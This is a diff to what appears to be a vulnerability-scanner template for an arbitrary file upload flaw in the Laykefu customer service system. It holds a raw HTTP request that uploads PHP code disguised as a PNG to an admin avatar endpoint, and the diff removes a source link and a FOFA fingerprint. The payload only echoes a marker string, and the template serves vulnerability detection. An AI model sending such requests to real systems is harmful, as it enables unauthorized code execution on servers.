@@ -3,12 +3,8 @@ info:
   name: Laykefu客服系统 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lqheid2ct15r6lag'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lqheid2ct15r6lag
-    fofa: icon_hash="-334624619"
 http:
 - raw:
   - 'POST /admin/users/upavatar.html HTTP/1.1
@@ -35,8 +31,6 @@ http:
     Connection: close
 
 
-
-
     ------WebKitFormBoundary3OCVBiwBVsNuB2kR
 
 
@@ -44,8 +38,6 @@ http:
 
 
     Content-Type: image/png
-
-
 
 
     <?php echo "dudesite"; ?>
